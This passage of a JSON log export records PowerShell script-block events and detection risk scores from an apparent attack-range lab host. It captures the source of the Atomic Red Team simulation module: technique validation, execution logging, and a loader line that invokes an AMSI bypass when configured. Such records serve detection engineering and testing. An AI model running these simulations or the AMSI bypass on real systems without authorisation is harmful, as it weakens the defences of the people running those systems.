      "full_command": "filter Get-AtomicTechnique {\n    <#\n    .SYNOPSIS\n\n    Retrieve and validate an atomic technique.\n\n    .DESCRIPTION\n\n    Get-AtomicTechnique retrieves and validates one or more atomic techniques. Get-AtomicTechnique supports retrieval from YAML files or from a raw YAML string.\n\n    This function facilitates the following use cases:\n\n    1) Validation prior to execution of atomic tests.\n    2) Writing code to reason over one or more atomic techniques/tests.\n    3) Representing atomic techniques/tests in a format that is more conducive to PowerShell. ConvertFrom-Yaml returns a large, complicated hashtable that is difficult to work with and reason over. Get-AtomicTechnique helps abstract those challenges away.\n    4) Representing atomic techniques/tests in a format that can be piped directly to ConvertTo-Yaml.\n\n    .PARAMETER Path\n\n    Specifies the path to an atomic technique YAML file. Get-AtomicTechnique expects that the file extension be .yaml or .yml and that it is well-formed YAML content.\n\n    .PARAMETER Yaml\n\n    Specifies a single string consisting of raw atomic technique YAML.\n\n    .EXAMPLE\n\n    Get-ChildItem -Path C:\\atomic-red-team\\atomics\\* -Recurse -Include 'T*.yaml' | Get-AtomicTechnique\n\n    .EXAMPLE\n\n    Get-Item C:\\atomic-red-team\\atomics\\T1117\\T1117.yaml | Get-AtomicTechnique\n\n    .EXAMPLE\n\n    Get-AtomicTechnique -Path C:\\atomic-red-team\\atomics\\T1117\\T1117.yaml\n\n    .EXAMPLE\n\n    $Yaml = @'\n    ---\n    attack_technique: T1152\n    display_name: Launchctl\n\n    atomic_tests:\n    - name: Launchctl\n      description: |\n        Utilize launchctl\n\n      supported_platforms:\n        - macos\n\n      executor:\n        name: sh\n        command: |\n          launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator\n    '@\n\n    Get-AtomicTechnique -Yaml $Yaml\n\n    .INPUTS\n\n    System.IO.FileInfo\n\n    The output of Get-Item and Get-ChildItem can be piped directly into Get-AtomicTechnique.\n\n    .OUTPUTS\n\n    AtomicTechnique\n\n    Outputs an object representing a parsed and validated atomic technique.\n    #>\n\n    [CmdletBinding(DefaultParameterSetName = 'FilePath')]\n    [OutputType([AtomicTechnique])]\n    param (\n        [Parameter(Mandatory, ValueFromPipelineByPropertyName, ParameterSetName = 'FilePath')]\n        [String]\n        [Alias('FullName')]\n        [ValidateScript({ Test-Path -Path $_ -Include '*.yaml', '*.yml' })]\n        $Path,\n\n        [Parameter(Mandatory, ParameterSetName = 'Yaml')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Yaml\n    )\n\n\n    switch ($PSCmdlet.ParameterSetName) {\n        'FilePath' {\n            $ResolvedPath = Resolve-Path -Path $Path\n\n            $YamlContent = Get-Content -Path $ResolvedPath -Raw\n            $ErrorStringPrefix = \"[$($ResolvedPath)]\"\n        }\n\n        'Yaml' {\n            $YamlContent = $Yaml\n            $ErrorStringPrefix = ''\n        }\n    }\n\n    $ParsedYaml = $null\n\n    $ValidSupportedPlatforms = @('windows', 'macos', 'linux', 'office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n    $ValidInputArgTypes = @('Path', 'Url', 'String', 'Integer', 'Float')\n    $ValidExecutorTypes = @('command_prompt', 'sh', 'bash', 'powershell', 'manual', 'aws', 'az', 'gcloud', 'kubectl')\n\n    # ConvertFrom-Yaml will throw a .NET exception rather than a PowerShell error.\n    # Capture the exception and convert to PowerShell error so that the user can decide\n    # how to handle the error.\n    try {\n        [Hashtable] $ParsedYaml = ConvertFrom-Yaml -Yaml $YamlContent\n    }\n    catch {\n        Write-Error $_\n    }\n\n    if ($ParsedYaml) {\n        # The document was well-formed YAML. Now, validate against the atomic red schema\n\n        $AtomicInstance = [AtomicTechnique]::new()\n\n        if (-not $ParsedYaml.Count) {\n            Write-Error \"$ErrorStringPrefix YAML file has no elements.\"\n            return\n        }\n\n        if (-not $ParsedYaml.ContainsKey('attack_technique')) {\n            Write-Error \"$ErrorStringPrefix 'attack_technique' element is required.\"\n            return\n        }\n\n        $AttackTechnique = $null\n\n        if ($ParsedYaml['attack_technique'].Count -gt 1) {\n            # An array of attack techniques are supported.\n            foreach ($Technique in $ParsedYaml['attack_technique']) {\n                if (\"$Technique\" -notmatch '^(?-i:T\\d{4}(\\.\\d{3}){0,1})$') {\n                    Write-Warning \"$ErrorStringPrefix Attack technique: $Technique. Each attack technique should start with the letter 'T' followed by a four digit number.\"\n                }\n\n                [String[]] $AttackTechnique = $ParsedYaml['attack_technique']\n            }\n        }\n        else {\n            if ((-not \"$($ParsedYaml['attack_technique'])\".StartsWith('T'))) {\n                # If the attack technique is a single entry, validate that it starts with the letter T.\n                Write-Warning \"$ErrorStringPrefix Attack technique: $($ParsedYaml['attack_technique']). Attack techniques should start with the letter T.\"\n            }\n\n            [String] $AttackTechnique = $ParsedYaml['attack_technique']\n        }\n\n        $AtomicInstance.attack_technique = $AttackTechnique\n\n        if (-not $ParsedYaml.ContainsKey('display_name')) {\n            Write-Error \"$ErrorStringPrefix 'display_name' element is required.\"\n            return\n        }\n\n        if (-not ($ParsedYaml['display_name'] -is [String])) {\n            Write-Error \"$ErrorStringPrefix 'display_name' must be a string.\"\n            return\n        }\n\n        $AtomicInstance.display_name = $ParsedYaml['display_name']\n\n        if (-not $ParsedYaml.ContainsKey('atomic_tests')) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element is required.\"\n            return\n        }\n\n        if (-not ($ParsedYaml['atomic_tests'] -is [System.Collections.Generic.List`1[Object]])) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element must be an array.\"\n            return\n        }\n\n        $AtomicTests = [AtomicTest[]]::new($ParsedYaml['atomic_tests'].Count)\n\n        if (-not $ParsedYaml['atomic_tests'].Count) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element is empty - you have no tests.\"\n            return\n        }\n\n        for ($i = 0; $i -lt $ParsedYaml['atomic_tests'].Count; $i++) {\n            $AtomicTest = $ParsedYaml['atomic_tests'][$i]\n\n            $AtomicTestInstance = [AtomicTest]::new()\n\n            $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'\n\n            if (-not $AtomicTest.ContainsKey('name')) {\n                Write-Error \"$ErrorStringPrefix 'atomic_tests[$i].name' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['name'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix 'atomic_tests[$i].name' element must be a string.\"\n                return\n            }\n\n            $AtomicTestInstance.name = $AtomicTest['name']\n            $AtomicTestInstance.auto_generated_guid = $AtomicTest['auto_generated_guid']\n\n            if (-not $AtomicTest.ContainsKey('description')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['description'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element must be a string.\"\n                return\n            }\n\n            $AtomicTestInstance.description = $AtomicTest['description']\n\n            if (-not $AtomicTest.ContainsKey('supported_platforms')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['supported_platforms'] -is [System.Collections.Generic.List`1[Object]])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element must be an array.\"\n                return\n            }\n\n            foreach ($SupportedPlatform in $AtomicTest['supported_platforms']) {\n                if ($ValidSupportedPlatforms -cnotcontains $SupportedPlatform) {\n                    Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms': '$SupportedPlatform' must be one of the following: $($ValidSupportedPlatforms -join ', ').\"\n                }\n            }\n\n            $AtomicTestInstance.supported_platforms = $AtomicTest['supported_platforms']\n\n            $Dependencies = $null\n\n            if ($AtomicTest['dependencies'].Count) {\n                $Dependencies = [AtomicDependency[]]::new($AtomicTest['dependencies'].Count)\n                $j = 0\n\n                # dependencies are optional and there can be multiple\n                foreach ($Dependency in $AtomicTest['dependencies']) {\n                    $DependencyInstance = [AtomicDependency]::new()\n\n                    if (-not $Dependency.ContainsKey('description')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['description'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.description = $Dependency['description']\n                    $StringsWithPotentialInputArgs.Add($Dependency['description'])\n\n                    if (-not $Dependency.ContainsKey('prereq_command')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['prereq_command'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.prereq_command = $Dependency['prereq_command']\n                    $Str",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 3,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4293163+00:00",
      "event_id": 35710562,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 426,
      "full_command": "function Invoke-KillProcessTree {\n    Param([int]$ppid)\n    if ($IsLinux -or $IsMacOS) {\n        sh -c \"pkill -9 -P $ppid\"\n    }\n    else {\n        while ($null -ne ($gcim = Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq $ppid })) {\n            $gcim | ForEach-Object { Invoke-KillProcessTree $_.ProcessId; Start-Sleep -Seconds 0.5 }\n        }\n        Stop-Process -Id $ppid -ErrorAction Ignore\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.1565312+00:00",
      "event_id": 35711050,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 847,
      "full_command": "#requires -Version 5.0\n\n# execute amsi bypass if configured to use one\nif([bool]$artConfig.absb -and ($artConfig.OS -eq \"windows\")){\n    $artConfig.absb.Invoke()\n}\n\n#Get public and private function definition files.\n$Public = @( Get-ChildItem -Path $PSScriptRoot\\Public\\*.ps1 -Recurse -Exclude AtomicRunnerService.ps1 -ErrorAction SilentlyContinue )\n$Private = @( Get-ChildItem -Path $PSScriptRoot\\Private\\*.ps1 -Recurse -Exclude \"AtomicClassSchema.ps1\" -ErrorAction SilentlyContinue )\n\n# Make sure the Atomic Class Schema is available first (a workaround so PSv5.0 doesn't give errors)\n. \"$PSScriptRoot\\Private\\AtomicClassSchema.ps1\"\n\n#Dot source the files\nForeach ($import in @($Public + $Private)) {\n    Try {\n        . $import.fullname\n    }\n    Catch {\n        Write-Error -Message \"Failed to import function $($import.fullname): $_\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.1514444+00:00",
      "event_id": 35711047,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1654,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n    if ($isWindows -and -not [System.Diagnostics.EventLog]::Exists('Atomic Red Team')) {\n        New-EventLog -Source \"Applications and Services Logs\" -LogName \"Atomic Red Team\"\n    }\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = $ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"Tag\"                    = \"atomicrunner\"\n        \"CustomTag\"              = $artConfig.CustomTag\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    Write-EventLog  -Source \"Applications and Services Logs\" -LogName \"Atomic Red Team\" -EventID 3001 -EntryType Information -Message $msg -Category 1 -RawData 10, 20\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.1474015+00:00",
      "event_id": 35711044,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1699,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = $ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"Tag\"                    = \"atomicrunner\"\n        \"CustomTag\"              = $artConfig.CustomTag\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    # send syslog message if a syslog server is defined in Public/config.ps1\n    if ([bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {\n        $jsonMsg = $msg | ConvertTo-Json -Compress\n        Send-SyslogMessage -Server $artConfig.syslogServer -Port $artConfig.syslogPort -Message $jsonMsg -Severity \"Informational\" -Facility \"daemon\" -Transport $artConfig.syslogProtocol\n    }\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.143297+00:00",
      "event_id": 35711041,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 6031,
      "full_command": "# Attire-ExecutionLogger.psm1\n# Copyright 2023 Security Risk Advisors\n\n# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the â€œSoftwareâ€),\n# to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,\n# and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\n# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n\n# THE SOFTWARE IS PROVIDED â€œAS ISâ€, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n#  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n#  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\n$script:attireLog = [PSCustomObject]@{\n    'attire-version' = '1.1'\n    'execution-data' = ''\n    'procedures'     = @()\n}\n\nfunction Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    if ($targetUser -isnot [string]) {\n        if ([bool]($targetUser.PSobject.Properties.name -match \"^value$\")) {\n            $targetUser = $targetUser.value\n        }\n        else {\n            $targetUser = $targetUser.ToString()\n        }\n    }\n    if ($targetHostname -isnot [string]) {\n        if ([bool]($targetHostname.PSobject.Properties.name -match \"^value$\")) {\n            $targetHostname = $targetHostname.value\n        }\n        else {\n            $targetHostname = $targetHostname.ToString()\n        }\n    }\n\n    $target = [PSCustomObject]@{\n        user = $targetUser\n        host = $targetHostname\n        ip   = $ipAddress\n        path = $Env:PATH\n    }\n\n    $guid = New-Guid\n    $bytes = [System.Text.Encoding]::UTF8.GetBytes($guid.Guid)\n    $executionId = [Convert]::ToBase64String($bytes)\n\n    $executionCategory = [PSCustomObject]@{\n        'name'         = \"Atomic Red Team\"\n        'abbreviation' = \"ART\"\n    }\n\n    $executionData = [PSCustomObject]@{\n        'execution-source'   = \"Invoke-Atomicredteam\"\n        'execution-id'       = $executionId\n        'execution-category' = $executionCategory\n        'execution-command'  = $commandLine\n        target               = $target\n        'time-generated'     = \"\"\n    }\n\n    $script:attireLog.'execution-data' = $executionData\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n\n    $startTime = (Get-Date($startTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()\n    $stopTime = (Get-Date($stopTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()\n\n    $procedureId = [PSCustomObject]@{\n        type = \"guid\"\n        id   = $testGuid\n    }\n\n    $step = [PSCustomObject]@{\n        'order'      = 1\n        'time-start' = $startTime\n        'time-stop'  = $stopTime\n        'executor'   = $testExecutor\n        'command'    = $command\n        'process-id' = $res.ProcessId\n        'exit-code'  = $res.ExitCode\n        'is-timeout' = $res.IsTimeout\n        'output'     = @()\n    }\n\n    $stdOutContents = $res.StandardOutput\n    if (($stdOutContents -isnot [string]) -and ($null -ne $stdOutContents)) {\n        $stdOutContents = $stdOutContents.ToString()\n    }\n\n    $outputStdConsole = [PSCustomObject]@{\n        content = $stdOutContents\n        level   = \"STDOUT\"\n        type    = \"console\"\n    }\n\n    $stdErrContents = $res.ErrorOutput\n    if (($stdErrContents -isnot [string]) -and ($null -ne $stdErrContents)) {\n        $stdErrContents = $stdErrContents.ToString()\n    }\n\n    $outputErrConsole = [PSCustomObject]@{\n        content = $stdErrContents\n        level   = \"STDERR\"\n        type    = \"console\"\n    }\n\n    [bool] $foundOutput = $false\n    if ($res.StandardOutput.length -gt 0) {\n        $foundOutput = $true\n        $step.output += $outputStdConsole\n    }\n\n    if ($res.ErrorOutput.length -gt 0) {\n        $foundOutput = $true\n        $step.output += $outputErrConsole\n    }\n\n    if (!$foundOutput) {\n        $emptyOutput = [PSCustomObject]@{\n            content = \"\"\n            level   = \"STDOUT\"\n            type    = \"console\"\n        }\n        $step.output += $emptyOutput\n    }\n\n    $procedure = [PSCustomObject]@{\n        'mitre-technique-id'    = $technique\n        'procedure-name'        = $testName\n        'procedure-id'          = $procedureId\n        'procedure-description' = $testDescription\n        order                   = $testNum\n        steps                   = @()\n    }\n\n    $procedure.steps += $step\n\n    $script:attireLog.procedures += $procedure\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n    $script:attireLog.'execution-data'.'time-generated' = (Get-Date (Get-Date).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z')\n    #$script:attireLog | Export-Csv -Path \"attireLogObject.csv\"\n    $content = ($script:attireLog | ConvertTo-Json -Depth 12)\n    #$Utf8NoBom = New-Object System.Text.UTF8Encoding $False\n    [System.IO.File]::WriteAllLines((Resolve-NonexistantPath($logPath)), $content)\n    #Out-File -FilePath $logPath -InputObject ($script:attireLog | ConvertTo-Json -Depth 12) -Append -Encoding ASCII\n    $script:attireLog = [PSCustomObject]@{\n        'attire-version' = '1.1'\n        'execution-data' = ''\n        procedures       = @()\n    }\n}\n\nfunction Resolve-NonexistantPath($File) {\n    $Path = Resolve-Path $File -ErrorAction SilentlyContinue -ErrorVariable error\n\n    if (-not($Path)) {\n        $Path = $error[0].TargetObject\n    }\n\n    return $Path\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4556781+00:00",
      "event_id": 35710579,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 195,
      "full_command": "function Get-PrereqExecutor ($test) {\n    if ($nul -eq $test.dependency_executor_name) { $executor = $test.executor.name }\n    else { $executor = $test.dependency_executor_name }\n    $executor\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.1389142+00:00",
      "event_id": 35711038,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1359,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    if (!(Test-Path $logPath)) {\n        New-Item $logPath -Force -ItemType File | Out-Null\n    }\n    $ipAddress = Get-PreferredIPAddress $isWindows\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = $ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    $msg | Export-Csv -Path $LogPath -NoTypeInformation -Append\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.0107947+00:00",
      "event_id": 35710854,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 6031,
      "full_command": "# Attire-ExecutionLogger.psm1\n# Copyright 2023 Security Risk Advisors\n\n# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the â€œSoftwareâ€),\n# to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,\n# and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\n# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n\n# THE SOFTWARE IS PROVIDED â€œAS ISâ€, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n#  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n#  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\n$script:attireLog = [PSCustomObject]@{\n    'attire-version' = '1.1'\n    'execution-data' = ''\n    'procedures'     = @()\n}\n\nfunction Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    if ($targetUser -isnot [string]) {\n        if ([bool]($targetUser.PSobject.Properties.name -match \"^value$\")) {\n            $targetUser = $targetUser.value\n        }\n        else {\n            $targetUser = $targetUser.ToString()\n        }\n    }\n    if ($targetHostname -isnot [string]) {\n        if ([bool]($targetHostname.PSobject.Properties.name -match \"^value$\")) {\n            $targetHostname = $targetHostname.value\n        }\n        else {\n            $targetHostname = $targetHostname.ToString()\n        }\n    }\n\n    $target = [PSCustomObject]@{\n        user = $targetUser\n        host = $targetHostname\n        ip   = $ipAddress\n        path = $Env:PATH\n    }\n\n    $guid = New-Guid\n    $bytes = [System.Text.Encoding]::UTF8.GetBytes($guid.Guid)\n    $executionId = [Convert]::ToBase64String($bytes)\n\n    $executionCategory = [PSCustomObject]@{\n        'name'         = \"Atomic Red Team\"\n        'abbreviation' = \"ART\"\n    }\n\n    $executionData = [PSCustomObject]@{\n        'execution-source'   = \"Invoke-Atomicredteam\"\n        'execution-id'       = $executionId\n        'execution-category' = $executionCategory\n        'execution-command'  = $commandLine\n        target               = $target\n        'time-generated'     = \"\"\n    }\n\n    $script:attireLog.'execution-data' = $executionData\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n\n    $startTime = (Get-Date($startTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()\n    $stopTime = (Get-Date($stopTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()\n\n    $procedureId = [PSCustomObject]@{\n        type = \"guid\"\n        id   = $testGuid\n    }\n\n    $step = [PSCustomObject]@{\n        'order'      = 1\n        'time-start' = $startTime\n        'time-stop'  = $stopTime\n        'executor'   = $testExecutor\n        'command'    = $command\n        'process-id' = $res.ProcessId\n        'exit-code'  = $res.ExitCode\n        'is-timeout' = $res.IsTimeout\n        'output'     = @()\n    }\n\n    $stdOutContents = $res.StandardOutput\n    if (($stdOutContents -isnot [string]) -and ($null -ne $stdOutContents)) {\n        $stdOutContents = $stdOutContents.ToString()\n    }\n\n    $outputStdConsole = [PSCustomObject]@{\n        content = $stdOutContents\n        level   = \"STDOUT\"\n        type    = \"console\"\n    }\n\n    $stdErrContents = $res.ErrorOutput\n    if (($stdErrContents -isnot [string]) -and ($null -ne $stdErrContents)) {\n        $stdErrContents = $stdErrContents.ToString()\n    }\n\n    $outputErrConsole = [PSCustomObject]@{\n        content = $stdErrContents\n        level   = \"STDERR\"\n        type    = \"console\"\n    }\n\n    [bool] $foundOutput = $false\n    if ($res.StandardOutput.length -gt 0) {\n        $foundOutput = $true\n        $step.output += $outputStdConsole\n    }\n\n    if ($res.ErrorOutput.length -gt 0) {\n        $foundOutput = $true\n        $step.output += $outputErrConsole\n    }\n\n    if (!$foundOutput) {\n        $emptyOutput = [PSCustomObject]@{\n            content = \"\"\n            level   = \"STDOUT\"\n            type    = \"console\"\n        }\n        $step.output += $emptyOutput\n    }\n\n    $procedure = [PSCustomObject]@{\n        'mitre-technique-id'    = $technique\n        'procedure-name'        = $testName\n        'procedure-id'          = $procedureId\n        'procedure-description' = $testDescription\n        order                   = $testNum\n        steps                   = @()\n    }\n\n    $procedure.steps += $step\n\n    $script:attireLog.procedures += $procedure\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n    $script:attireLog.'execution-data'.'time-generated' = (Get-Date (Get-Date).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z')\n    #$script:attireLog | Export-Csv -Path \"attireLogObject.csv\"\n    $content = ($script:attireLog | ConvertTo-Json -Depth 12)\n    #$Utf8NoBom = New-Object System.Text.UTF8Encoding $False\n    [System.IO.File]::WriteAllLines((Resolve-NonexistantPath($logPath)), $content)\n    #Out-File -FilePath $logPath -InputObject ($script:attireLog | ConvertTo-Json -Depth 12) -Append -Encoding ASCII\n    $script:attireLog = [PSCustomObject]@{\n        'attire-version' = '1.1'\n        'execution-data' = ''\n        procedures       = @()\n    